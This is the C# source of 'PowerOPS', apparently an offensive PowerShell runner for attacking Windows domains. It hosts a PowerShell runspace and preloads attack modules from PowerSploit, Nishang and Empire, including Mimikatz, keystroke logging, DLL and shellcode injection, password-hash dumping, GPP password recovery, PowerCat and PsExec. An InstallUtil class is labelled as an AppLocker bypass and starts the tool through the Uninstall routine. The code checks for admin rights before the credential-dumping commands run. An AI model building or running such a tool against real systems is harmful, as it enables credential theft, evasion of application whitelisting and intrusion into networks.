using System;
using System.IO;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.DirectoryServices;
using System.Security.Principal;


namespace PowerOPS
{
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        // @subTee app locker bypass
        public override void Install(System.Collections.IDictionary savedState)
        {
            			
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();
        }
    }

    class Program
    {
        public static void DisplayBanner(string[] toPrint = null)
        {
            Console.Clear();
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.WriteLine(@"PowerOPS v0.5 - PowerShell for Offensive Operations"); Console.ResetColor(); Console.WriteLine();
        }

        public static void DisplayModules()
        {
            Console.ForegroundColor = ConsoleColor.Green; if (!isDomainJoined()) Console.WriteLine("\n[-] This computer is not part of a Domain! Some functions will not work!"); Console.ResetColor();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[+] Nishang\n"); Console.ResetColor();
            Console.Write(" Get-Information    Get-PassHashes             Port-Scan\n");

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[+] PowerSploit\n"); Console.ResetColor();
            Console.Write(" Get-KeyStrokes     Invoke-DllInjection        Invoke-Mimikatz     Invoke-NinjaCopy\n");
            Console.Write(" Invoke-Shellcode   Invoke-TokenManipulation   Invoke-WmiCommand   Invoke-ReflectivePEInjection\n");
            Console.Write(" PowerView          PowerUp\n");

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[+] Empire\n"); Console.ResetColor();
            Console.Write(" Invoke-PsExec      Invoke-SSHCommand\n");

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[+] Others\n"); Console.ResetColor();
            Console.Write(" Auto-GPPPassword   Get-ProductKey             PowerCat\n");

            Console.ResetColor();
            Console.WriteLine("");
        }

        public static bool isDomainJoined()
        {
            try
            {
                System.DirectoryServices.ActiveDirectory.Domain.GetComputerDomain();
            }
            catch
            {
                return false;
            }
            return true;
        }

        public static bool isArch_x86()
        {
            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            if (Arch == "x86")
                return true;
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\nSorry, this module is only for x86.\n");
                Console.ResetColor();
                return false;
            }
        }

        public static bool IsUserAdministrator()
        {
            bool isAdmin;
            WindowsIdentity user = null;
            try
            {
                user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException)
            {
                isAdmin = false;
            }
            catch (Exception)
            {
                isAdmin = false;
            }
            finally
            {
                if (user != null)
                    user.Dispose();
            }
            if (isAdmin == false)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\nSorry, you need Admin privileges to perform this action.\n");
                Console.ResetColor();
                return false;
            }
            else
                return true;
        }

        public static void cleanUp()
        {
            Console.WriteLine("\nPress any key to continue...\n");
            Console.ReadKey();
            Console.Clear();
        }

        public static void Main()
        {
            Console.Title = "PowerOPS - rui@deniable.org";
            Console.SetWindowSize(Math.Min(122, Console.LargestWindowWidth), Math.Min(40, Console.LargestWindowHeight));
            Console.SetBufferSize(Console.BufferWidth, Console.BufferHeight);

            string command = null;
            DisplayBanner();
            Console.WriteLine("Type 'show' to list available modules\n");

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            do
            {
                Console.Write("PS > ");
                command = Console.ReadLine();

                switch (command)
                {
                    case "show":
                        DisplayModules();
                        break;
                    case "exit":
                        return;
                    default:
                        if (command.IndexOf("Invoke-Mimikatz", StringComparison.OrdinalIgnoreCase) >= 0)
                            if (!IsUserAdministrator())
                                break;
                        if (command.IndexOf("Get-PassHashes", StringComparison.OrdinalIgnoreCase) >= 0)
                            if (!IsUserAdministrator())
                                break;
                        if (command.IndexOf("Invoke-Shellcode", StringComparison.OrdinalIgnoreCase) >= 0)
                            if (!isArch_x86())
                                break;

                        try
                        {  
                            Pipeline pipeline = runspace.CreatePipeline();
                            pipeline.Commands.AddScript(PowerOPS.GetKeyStrokes());
                            pipeline.Commands.AddScript(PowerOPS.InvokeDLLInjection());
                            pipeline.Commands.AddScript(PowerOPS.InvokeMimikatz());
                            pipeline.Commands.AddScript(PowerOPS.InvokeNinjaCopy());
                            pipeline.Commands.AddScript(PowerOPS.InvokeReflectivePEInjection());
                            pipeline.Commands.AddScript(PowerOPS.InvokeShellcode());
                            pipeline.Commands.AddScript(PowerOPS.InvokeTokenManipulation());
                            pipeline.Commands.AddScript(PowerOPS.InvokeWMICommand());
                            pipeline.Commands.AddScript(PowerOPS.PowerUp());
                            pipeline.Commands.AddScript(PowerOPS.PowerView());
                            pipeline.Commands.AddScript(PowerOPS.Nishang_GetInformation());
                            pipeline.Commands.AddScript(PowerOPS.Nishang_GetPassHashes());
                            pipeline.Commands.AddScript(PowerOPS.Nishang_PortScan());
                            pipeline.Commands.AddScript(PowerOPS.AutoGPPPassword());
                            pipeline.Commands.AddScript(PowerOPS.PowerCat());
                            pipeline.Commands.AddScript(PowerOPS.GetProductKey());
                            pipeline.Commands.AddScript(PowerOPS.Empire_InvokePSExec());
                            pipeline.Commands.AddScript(PowerOPS.Empire_InvokeSshCommand());
                            pipeline.Commands.AddScript(command);
                            pipeline.Commands.Add("Out-String");
                            Collection<PSObject> results = pipeline.Invoke();
                             
                            StringBuilder stringBuilder = new StringBuilder();
                            foreach (PSObject obj in results)
                            {
                                stringBuilder.AppendLine(obj.ToString());
                            }
                            Console.Write(stringBuilder.ToString());
                            
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("{0}", e.Message);
                        }        
                        break;
                }

            } while (command != "exit");

            runspace.Close();
            Environment.Exit(0);
        }

    }
}
